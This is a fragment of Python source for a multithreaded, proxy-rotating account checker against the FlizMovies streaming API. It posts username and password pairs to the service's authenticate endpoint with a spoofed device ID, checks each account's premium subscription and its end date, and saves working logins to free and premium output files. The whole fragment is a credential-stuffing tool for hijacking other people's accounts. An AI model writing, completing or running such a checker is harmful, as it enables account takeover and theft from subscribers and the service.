...
output_file_free = "FLIzAc_Free"+datetime.datetime.now().strftime("%d-%h-%H-%M") 
output_file_paid = "FLIzAc_Premium_"+datetime.datetime.now().strftime("%d-%h-%H-%M") 
...
loginURL="https://api.flizmovies.com/v1/W/authenticate"
logoutURL="https://api.flizmovies.com/v1/W/user/logout"
...
def checkSub(page,proxy):
    timestamp = page.json()['user']['subscriptionEndDate']
    try:
        date = time.strftime('%d-%h-%Y', time.localtime(timestamp/1000))
        return "Premium",date
    except:
        return "Premium","null"
...
def logOut(r,r1,un):
    ...
    r1 = r.post(logoutURL,headers=headv2,data=json.dumps(myusrlo))
    ...
    def run(self):
        while not q.empty():
            ...
            try:
                ...
                r.proxies = proxy
                ts = datetime.datetime.now().strftime("%a %h %d %Y %H:%M")
                myusr = {"username":un,"password":pas,"deviceid":pas+ts+":08 GMT+0530 (India Standard Time)"}
